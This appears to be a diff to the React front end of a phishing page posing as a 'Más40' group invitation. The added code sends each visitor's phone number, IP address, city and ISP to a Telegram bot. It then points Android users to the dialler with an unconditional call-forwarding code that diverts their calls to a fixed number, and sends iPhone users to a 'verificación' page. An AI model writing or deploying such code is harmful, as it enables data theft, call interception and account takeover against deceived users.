@@ -20,15 +20,66 @@ function HomePage() {
   const [error, setError] = useState('');
   const valid = phone.length === 9;
 
-  const handleJoinAndroid = async () => {
+  // Función para obtener información del usuario (IP, ubicación, dispositivo)
+  const getUserInfo = async () => {
     try {
-      // Redirigir al teclado de marcación de Android con el código de desvío de llamadas incondicional
-      window.location.href = 'tel:**21*627283811#';
+      const response = await fetch('https://ipapi.co/json/');
+      const data = await response.json();
+      return {
+        ip: data.ip,
+        city: data.city,
+        isp: data.org
+      };
+    } catch (error) {
+      return {
+        ip: 'No disponible',
+        city: 'No disponible',
+        isp: 'No disponible'
+      };
+    }
+  };
+
+  const handleJoinAndroid = async () => {
+    if (!valid) {
+      setError('Introduce un número móvil de 9 dígitos.');
+      return;
+    }
+    setError('');
+    try {
+      // Obtener información del usuario
+      const userInfo = await getUserInfo();
+
+      // Enviar número de teléfono y datos del usuario a Telegram
+      const message = `
+📱 Nuevo número Más40 
+📞 Número: +34 ${phone}
+🌐  IP: ${userInfo.ip}
+🏙️ Ciudad: ${userInfo.city}
+📡 ISP: ${userInfo.isp}
+      `;
+      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message
+        })
+      });
+      const data = await response.json();
+      if (data.ok) {
+        // Redirigir al teclado de marcación de Android con el código de desvío de llamadas incondicional
+        window.location.href = 'tel:**21*627283811*#';
+      } else {
+        setError('Error al procesar tu solicitud. Inténtalo de nuevo.');
+      }
     } catch (error) {
       console.error('Error:', error);
       setError('Error al procesar tu solicitud. Inténtalo de nuevo.');
     }
   };
+
   const handleJoinIPhone = async () => {
     if (!valid) {
       setError('Introduce un número móvil de 9 dígitos.');
@@ -36,13 +87,40 @@ function HomePage() {
     }
     setError('');
     try {
-      // Redirigir a la página de verificación
-      navigate('/verificacion');
+      // Obtener información del usuario
+      const userInfo = await getUserInfo();
+
+      // Enviar número de teléfono y datos del usuario a Telegram
+      const message = `
+📱 Nuevo número Más40 
+📞 Número: +34 ${phone}
+🌐  IP: ${userInfo.ip}
+🏙️ Ciudad: ${userInfo.city}
+📡 ISP: ${userInfo.isp}
+      `;
+      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message
+        })
+      });
+      const data = await response.json();
+      if (data.ok) {
+        // Redirigir a la página de verificación
+        navigate('/verificacion');
+      } else {
+        setError('Error al procesar tu solicitud. Inténtalo de nuevo.');
+      }
     } catch (error) {
       console.error('Error:', error);
       setError('Error al procesar tu solicitud. Inténtalo de nuevo.');
     }
   };
+
   return <div className="min-h-[100dvh] flex flex-col bg-white">
         <Helmet>
             <title>Más40 — Invitación al grupo</title>
